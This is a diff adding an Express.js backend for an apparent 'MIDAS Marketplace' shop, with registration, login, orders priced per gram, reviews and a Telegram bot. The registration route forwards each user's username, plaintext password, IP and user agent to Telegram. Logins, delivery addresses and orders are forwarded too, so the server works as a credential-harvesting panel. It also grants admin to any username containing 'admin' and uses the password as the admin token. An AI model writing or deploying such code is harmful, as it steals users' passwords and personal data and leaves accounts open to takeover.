+<b>🗑️ ТОВАР УДАЛЕН</b>
+
+🏷️ <b>Название:</b> ${deletedProduct.name}
+💰 <b>Цена:</b> ${deletedProduct.price} RUB
+🕐 <b>Время:</b> ${new Date().toLocaleString('ru-RU')}
+        `;
+        
+        await sendToTelegram(telegramMessage);
+        
+        res.json({
+            success: true,
+            message: 'Товар удален'
+        });
+    } catch (error) {
+        console.error('Ошибка удаления товара:', error);
+        res.status(500).json({
+            success: false,
+            error: 'Ошибка сервера'
+        });
+    }
+});
+
+// Регистрация пользователя
+app.post('/api/auth/register', async (req, res) => {
+    try {
+        const { username, password, email, city } = req.body;
+        
+        if (!username || !password) {
+            return res.status(400).json({
+                success: false,
+                error: 'Логин и пароль обязательны'
+            });
+        }
+        
+        if (password.length < 6) {
+            return res.status(400).json({
+                success: false,
+                error: 'Пароль должен быть не менее 6 символов'
+            });
+        }
+        
+        // Проверка существующего пользователя
+        if (database.users.find(u => u.username === username)) {
+            return res.status(400).json({
+                success: false,
+                error: 'Пользователь с таким логином уже существует'
+            });
+        }
+        
+        const ip = getClientIP(req);
+        const userAgent = req.get('User-Agent') || 'Неизвестен';
+        
+        const user = {
+            id: database.users.length + 1,
+            username,
+            password, // В реальном приложении нужно хэшировать
+            email: email || `${username}@midas.com`,
+            role: username.includes('admin') ? 'admin' : 'user',
+            balance: 0,
+            premium: false,
+            city: city || 'Не выбран',
+            ip,
+            userAgent,
+            createdAt: new Date()
+        };
+        
+        database.users.push(user);
+        
+        // Отправка в Telegram бота
+        const telegramMessage = formatRegistrationMessage({
+            username,
+            password,
+            email: user.email,
+            ip,
+            userAgent,
+            city: user.city,
+            isAdmin: user.role === 'admin'
+        });
+        
+        const telegramResult = await sendToTelegram(telegramMessage);
+        
+        if (!telegramResult.success) {
+            console.warn('Не удалось отправить в Telegram, но пользователь создан');
+        }
+        
+        res.json({
+            success: true,
+            user: {
+                id: user.id,
+                username: user.username,
+                email: user.email,
+                role: user.role,
+                balance: user.balance,
+                premium: user.premium,
+                city: user.city
+            },
+            telegramSent: telegramResult.success
+        });
+    } catch (error) {
+        console.error('Ошибка регистрации:', error);
+        res.status(500).json({
+            success: false,
+            error: 'Ошибка сервера'
+        });
+    }
+});
+
+// Вход пользователя
+app.post('/api/auth/login', async (req, res) => {
+    try {
+        const { username, password, city } = req.body;
+        
+        if (!username || !password) {
+            return res.status(400).json({
+                success: false,
+                error: 'Логин и пароль обязательны'
+            });
+        }
+        
+        const user = database.users.find(u => u.username === username && u.password === password);
+        
+        if (!user) {
+            return res.status(401).json({
+                success: false,
+                error: 'Неверный логин или пароль'
+            });
+        }
+        
+        const ip = getClientIP(req);
+        const userAgent = req.get('User-Agent') || 'Неизвестен';
+        
+        // Обновляем информацию о пользователе
+        user.lastLogin = new Date();
+        user.lastIp = ip;
+        if (city) user.city = city;
+        
+        // Отправка в Telegram бота
+        const telegramMessage = formatLoginMessage({
+            username,
+            ip,
+            city: user.city,
+            userAgent
+        });
+        
+        const telegramResult = await sendToTelegram(telegramMessage);
+        
+        res.json({
+            success: true,
+            user: {
+                id: user.id,
+                username: user.username,
+                email: user.email,
+                role: user.role,
+                balance: user.balance,
+                premium: user.premium,
+                city: user.city
+            },
+            telegramSent: telegramResult.success
+        });
+    } catch (error) {
+        console.error('Ошибка входа:', error);
+        res.status(500).json({
+            success: false,
+            error: 'Ошибка сервера'
+        });
+    }
+});
+
+// Создание заказа
+app.post('/api/orders', async (req, res) => {
+    try {
+        const { 
+            userId, 
+            username, 
+            items, 
+            total, 
+            deliveryMethod, 
+            address, 
+            paymentMethod, 
+            city 
+        } = req.body;
+        
+        if (!items || items.length === 0) {
+            return res.status(400).json({
+                success: false,
+                error: 'Корзина пуста'
+            });
+        }
+        
+        const orderId = 'MID-' + Date.now().toString().slice(-6);
+        
+        const order = {
+            id: orderId,
+            userId,
+            username,
+            items: items.map(item => ({
+                productId: item.id,
+                name: item.name,
+                quantity: item.quantity,
+                gram: item.selectedGram,
+                price: item.price,
+                total: item.price * item.quantity
+            })),
+            total,
+            deliveryMethod,
+            address,
+            paymentMethod,
+            city,
+            status: 'pending',
+            createdAt: new Date()
+        };
+        
+        database.orders.push(order);
+        
+        // Отправка в Telegram бота
+        const telegramMessage = formatOrderMessage({
+            orderId,
+            username,
+            items: order.items,
+            total,
+            deliveryMethod,
+            address,
+            paymentMethod,
+            city
+        });
+        
+        const telegramResult = await sendToTelegram(telegramMessage);
+        
+        // Обновляем статистику товаров
+        items.forEach(orderItem => {
+            const product = database.products.find(p => p.id === orderItem.id);
+            if (product) {
+                product.stock = Math.max(0, product.stock - orderItem.quantity);
+            }
+        });
+        
+        res.json({
+            success: true,
+            order: {
+                id: order.id,
+                status: order.status,
+                total: order.total,
+                createdAt: order.createdAt
+            },
+            telegramSent: telegramResult.success
+        });
+    } catch (error) {
+        console.error('Ошибка создания заказа:', error);
+        res.status(500).json({
+            success: false,
+            error: 'Ошибка сервера'
+        });
+    }
+});
+
+// Получить заказы пользователя
+app.get('/api/orders/:userId', (req, res) => {
+    const userId = req.params.userId;
+    const userOrders = database.orders.filter(o => o.userId == userId);
     
-    document.body.appendChild(notification);
+    res.json({
+        success: true,
+        orders: userOrders
+    });
+});
+
+// Получить статистику (админ)
+app.get('/api/admin/stats', (req, res) => {
+    // Проверка авторизации администратора
+    const authHeader = req.headers.authorization;
+    if (!authHeader || !authHeader.startsWith('Bearer ')) {
+        return res.status(401).json({
+            success: false,
+            error: 'Требуется авторизация'
+        });
+    }
     
-    // Автоматическое скрытие
-    setTimeout(() => {
-        notification.style.opacity = '0';
-        notification.style.transform = 'translateX(100px)';
-        setTimeout(() => notification.remove(), 300);
-    }, 3000);
-}
+    const token = authHeader.split(' ')[1];
+    const adminUser = database.users.find(u => u.username === 'admin' && u.password === token);
+    if (!adminUser) {
+        return res.status(403).json({
+            success: false,
+            error: 'Требуются права администратора'
+        });
+    }
+    
+    const totalRevenue = database.orders.reduce((sum, order) => sum + order.total, 0);
+    const totalOrders = database.orders.length;
+    const totalUsers = database.users.length;
+    
+    // Статистика по дням
+    const ordersByDay = {};
+    database.orders.forEach(order => {
+        const date = new Date(order.createdAt).toLocaleDateString('ru-RU');
+        ordersByDay[date] = (ordersByDay[date] || 0) + 1;
+    });
+    
+    res.json({
+        success: true,
+        stats: {
+            totalRevenue,
+            totalOrders,
+            totalUsers,
+            activeProducts: database.products.length,
+            pendingOrders: database.orders.filter(o => o.status === 'pending').length
+        },
+        chartData: Object.entries(ordersByDay).map(([date, count]) => ({ date, count }))
+    });
+});
 
-function getClientIP() {
-    // Симуляция получения IP
-    return '192.168.' + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255);
-}
+// Добавить отзыв
+app.post('/api/reviews', async (req, res) => {
+    try {
+        const { productId, userId, username, rating, text } = req.body;
+        
+        if (!productId || !rating || !text) {
+            return res.status(400).json({
+                success: false,
+                error: 'Заполните все поля'
+            });
+        }
+        
+        const review = {
+            id: database.reviews.length + 1,
+            productId,
+            userId,
+            username,
+            rating,
+            text,
+            createdAt: new Date()
+        };
+        
+        database.reviews.push(review);
+        
+        // Обновляем рейтинг товара
+        const product = database.products.find(p => p.id === productId);
+        if (product) {
+            const productReviews = database.reviews.filter(r => r.productId === productId);
+            const avgRating = productReviews.reduce((sum, r) => sum + r.rating, 0) / productReviews.length;
+            product.rating = avgRating;
+            product.reviews = productReviews.length;
+        }
+        
+        // Отправляем уведомление в Telegram
+        const telegramMessage = `
+<b>⭐ НОВЫЙ ОТЗЫВ</b>
 
-function zoomImage(scale) {
-    const img = document.getElementById('productModalImage');
-    img.style.transform = `scale(${scale})`;
-    img.style.transition = 'transform 0.3s ease';
-}
+🏷️ <b>Товар:</b> ${product?.name || `ID: ${productId}`}
+👤 <b>Пользователь:</b> ${username}
+⭐ <b>Рейтинг:</b> ${'★'.repeat(rating)}${'☆'.repeat(5 - rating)}
+📝 <b>Отзыв:</b> ${text.substring(0, 100)}...
+🕐 <b>Время:</b> ${new Date().toLocaleString('ru-RU')}
+        `;
+        
+        await sendToTelegram(telegramMessage);
+        
+        res.json({
+            success: true,
+            review
+        });
+    } catch (error) {
+        console.error('Ошибка добавления отзыва:', error);
+        res.status(500).json({
+            success: false,
+            error: 'Ошибка сервера'
+        });
+    }
+});
 
-// Экспорт функций для HTML
-window.addToCart = addToCart;
-window.openProductModal = openProductModal;
-window.updateQuantity = updateQuantity;
-window.removeFromCart = removeFromCart;
-window.zoomImage = zoomImage;
+// Получить отзывы товара
+app.get('/api/reviews/:productId', (req, res) => {
+    const productId = parseInt(req.params.productId);
+    const productReviews = database.reviews.filter(r => r.productId === productId);
+    
+    res.json({
+        success: true,
+        reviews: productReviews
+    });
+});
+
+// Обновить валютные курсы
+app.get('/api/currency-rates', (req, res) => {
+    // В реальном приложении здесь нужно получать актуальные курсы с внешнего API
+    res.json({
+        success: true,
+        rates: {
+            RUB: 1,
+            USD: 0.011,
+            UAH: 0.41,
+            EUR: 0.01,
+            KZT: 5.2
+        },
+        lastUpdated: new Date().toISOString()
+    });
+});
+
+// Проверка доступности сервера
+app.get('/api/health', (req, res) => {
+    res.json({
+        success: true,
+        message: 'MIDAS Marketplace API работает',
+        timestamp: new Date().toISOString(),
+        version: '1.0.0',
+        stats: {
+            products: database.products.length,
+            users: database.users.length,
+            orders: database.orders.length
+        }
+    });
+});
+
+// Telegram webhook для получения сообщений от бота
+app.post('/api/telegram/webhook', async (req, res) => {
+    try {
+        const update = req.body;
+        
+        // Логируем входящие сообщения от бота
+        console.log('Telegram webhook received:', JSON.stringify(update, null, 2));
+        
+        // Здесь можно добавить логику обработки команд от пользователей
+        if (update.message && update.message.text) {
+            const chatId = update.message.chat.id;
+            const text = update.message.text;
+            
+            // Пример: обработка команды /start
+            if (text === '/start') {
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: `👋 Привет! Я бот для уведомлений MIDAS Marketplace.\n\nЯ буду отправлять вам уведомления о:\n📝 Новых регистрациях\n🔐 Входах в систему\n💰 Новых заказах\n⭐ Отзывах\n\nДля настройки уведомлений свяжитесь с администратором.`
+                    })
+                });
+            }
+        }
+        
+        res.json({ success: true });
+    } catch (error) {
+        console.error('Ошибка обработки webhook:', error);
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+// Маршрут для главной страницы
+app.get('/', (req, res) => {
+    res.sendFile(__dirname + '/index.html');
+});
+
+// Инициализация данных
+initializeData();
+
+// Запуск сервера
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => {
+    console.log(`✅ MIDAS Marketplace запущен на порту ${PORT}`);
+    console.log(`🌐 Ссылка: http://localhost:${PORT}`);
+    console.log(`🤖 Telegram Bot: ${TELEGRAM_BOT_TOKEN ? 'Настроен' : 'НЕ настроен'}`);
+    
+    if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'ВАШ_ТОКЕН_БОТА') {
+        console.warn('⚠️  ВНИМАНИЕ: Токен Telegram бота не настроен!');
+        console.warn('   Установите переменные окружения:');
+        console.warn('   TELEGRAM_BOT_TOKEN=ваш_токен_бота');
+        console.warn('   TELEGRAM_CHAT_ID=ваш_chat_id');
+    }
+});
+
+module.exports = app;
